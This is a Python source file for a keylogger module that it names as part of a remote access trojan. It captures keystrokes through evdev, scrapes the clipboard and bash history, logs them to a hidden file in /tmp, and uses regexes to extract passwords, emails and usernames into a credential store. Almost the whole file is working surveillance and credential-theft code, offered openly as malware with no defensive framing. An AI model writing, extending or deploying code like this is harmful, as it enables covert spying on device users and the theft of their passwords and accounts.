"""
RAT Keylogger Module
Captures keystrokes and sensitive data from the target device
"""

import os
import threading
import re
import time
from datetime import datetime
from .config import Config
from .database import save_credential, get_credentials

class Keylogger:
    """Captures keystrokes and extracts sensitive information"""
    
    def __init__(self, config=None):
        self.config = config or Config()
        self.running = False
        self.keys_buffer = []
        self.captured_credentials = []
        self.lock = threading.Lock()
        self.keylog_file = "/tmp/opencode/.keylog_cache.txt"
        
        # Patterns to detect sensitive data
        self.password_patterns = [
            r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]+)',
            r'(?i)(pass|pwd)\s*[:=]\s*(\S+)',
            r'(?i)login.*?password\s*[:=]\s*["\']?([^"\'\s]+)',
        ]
        
        self.email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        self.username_pattern = r'(?i)(username|user|login|email)\s*[:=]\s*["\']?([^"\'\s@]+)@?'
        
    def start(self):
        """Start the keylogger"""
        self.running = True
        self._clear_keylog_file()
        
        # Try different methods based on platform
        platform = os.name
        
        if platform == 'posix':
            # Linux/Unix - use evdev or X11
            self._start_posix_keylogger()
        else:
            # Windows - use ctypes
            self._start_windows_keylogger()
            
        print("[+] Keylogger started")
        
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        print("[+] Keylogger stopped")
        
    def _clear_keylog_file(self):
        """Clear the keylog cache file"""
        try:
            if os.path.exists(self.keylog_file):
                os.remove(self.keylog_file)
        except:
            pass
            
    def _start_posix_keylogger(self):
        """Start keylogger on Linux/Unix systems"""
        thread = threading.Thread(target=self._posix_keylogger_loop)
        thread.daemon = True
        thread.start()
        
    def _posix_keylogger_loop(self):
        """Main keylogger loop for POSIX systems"""
        try:
            import evdev
            from evdev import InputDevice, categorize, ecodes
            
            devices = [InputDevice(path) for path in evdev.list_devices() 
                      if 'Event' in str(InputDevice(path).capabilities())]
            
            for device in devices:
                if ecodes.EV_KEY in device.capabilities():
                    print(f"[*] Listening on device: {device.name}")
                    self._listen_to_device(device)
                    
        except ImportError:
            print("[!] evdev not installed, using fallback method")
            self._fallback_keylogger()
        except Exception as e:
            print(f"[!] Keylogger error: {e}")
            self._fallback_keylogger()
            
    def _listen_to_device(self, device):
        """Listen to keyboard events from a device"""
        while self.running:
            try:
                for event in device.read_loop():
                    if event.type == evdev.ecodes.EV_KEY and event.value:
                        key = categorize(event)
                        if key.keysym == 'return':
                            key_text = '\n'
                        elif key.keysym == 'space':
                            key_text = ' '
                        elif key.keysym == 'backspace':
                            key_text = '<BACKSPACE>'
                        else:
                            key_text = key.text or ''
                            
                        self._process_key(key_text)
                        
            except Exception as e:
                if self.running:
                    print(f"[!] Device error: {e}")
                break
                
    def _fallback_keylogger(self):
        """Fallback keylogger using /proc or X11"""
        while self.running:
            try:
                # Monitor common input files
                self._monitor_terminal_input()
            except:
                pass
            time.sleep(0.5)
            
    def _monitor_terminal_input(self):
        """Monitor terminal and clipboard for input"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Check clipboard
        try:
            import subprocess
            result = subprocess.run(
                ['xclip', '-selection', 'clipboard', '-o'],
                capture_output=True,
                text=True,
                timeout=1
            )
            if result.stdout and len(result.stdout.strip()) > 0:
                clipboard_text = result.stdout.strip()
                with open(self.keylog_file, 'a') as f:
                    f.write(f'\n\n[{timestamp}] === CLIPBOARD ===\n{clipboard_text}\n======================\n\n')
                self._process_text(clipboard_text)
                print(f"[+] Clipboard captured: {len(clipboard_text)} chars")
        except Exception as e:
            pass
        
        # Monitor .bash_history
        try:
            history_file = os.path.expanduser('~/.bash_history')
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines[-5:]:  # Last 5 commands
                        if line.strip():
                            with open(self.keylog_file, 'a') as f:
                                f.write(f'\n[{timestamp}] === BASH HISTORY ===\n{line.strip()}\n========================\n\n')
                            self._process_text(line.strip())
        except Exception as e:
            pass
            
    def _start_windows_keylogger(self):
        """Start keylogger on Windows"""
        thread = threading.Thread(target=self._windows_keylogger_loop)
        thread.daemon = True
        thread.start()
        
    def _windows_keylogger_loop(self):
        """Main keylogger loop for Windows"""
        try:
            import ctypes
            from ctypes import wintypes
            
            # This would need proper Windows setup
            print("[*] Windows keylogger initialized (requires GUI access)")
        except Exception as e:
            print(f"[!] Windows keylogger error: {e}")
            
    def _process_key(self, key):
        """Process a single keystroke with timestamp"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
        
        with self.lock:
            self.keys_buffer.append(key)
            
            # Check for sensitive patterns
            if len(self.keys_buffer) > 50:
                text = ''.join(self.keys_buffer[-50:])
                self._extract_credentials(text)
                
            # Write to file with timestamp
            with open(self.keylog_file, 'a') as f:
                if key == '\n':
                    f.write(f'\n[{timestamp}] <ENTER>\n')
                elif key == ' ':
                    f.write(' ')
                elif len(key) == 1:
                    f.write(key)
                else:
                    f.write(f'[{timestamp}] {key}')
                
            # Limit buffer size
            if len(self.keys_buffer) > 1000:
                self.keys_buffer = self.keys_buffer[-500:]
                
    def _process_text(self, text):
        """Process a block of text"""
        with self.lock:
            self._extract_credentials(text)
            
            # Write to file
            with open(self.keylog_file, 'a') as f:
                f.write(text)
                
    def _extract_credentials(self, text):
        """Extract potential credentials from text"""
        # Extract passwords
        for pattern in self.password_patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                password = match[-1] if isinstance(match, tuple) else match
                if len(password) > 3:  # Minimum length
                    self._save_credential('keylog', 'unknown', password)
                    
        # Extract emails
        emails = re.findall(self.email_pattern, text)
        for email in emails:
            self._save_credential('keylog', email, '')
            
        # Extract usernames
        for match in re.finditer(self.username_pattern, text):
            username = match.group(2) if match.lastindex >= 2 else match.group(1)
            if username and len(username) > 2:
                self._save_credential('keylog', username, '')
                
    def _save_credential(self, source, username, password):
        """Save captured credential"""
        try:
            save_credential(source, username, password)
            self.captured_credentials.append({
                'source': source,
                'username': username,
                'password': password,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[+] Captured: {source} - {username}:{password}")
        except Exception as e:
            print(f"[-] Error saving credential: {e}")
            
    def get_keylog(self, lines=100):
        """Get recent keylog entries"""
        try:
            if os.path.exists(self.keylog_file):
                with open(self.keylog_file, 'r') as f:
                    content = f.read()
                    lines_list = content.split('\n')
                    return '\n'.join(lines_list[-lines:])
            return ""
        except:
            return ""
            
    def get_credentials(self):
        """Get all captured credentials"""
        return get_credentials(sent_only=True)
        
    def clear_keylog(self):
        """Clear the keylog file"""
        try:
            if os.path.exists(self.keylog_file):
                os.remove(self.keylog_file)
            self.keys_buffer.clear()
        except:
            pass
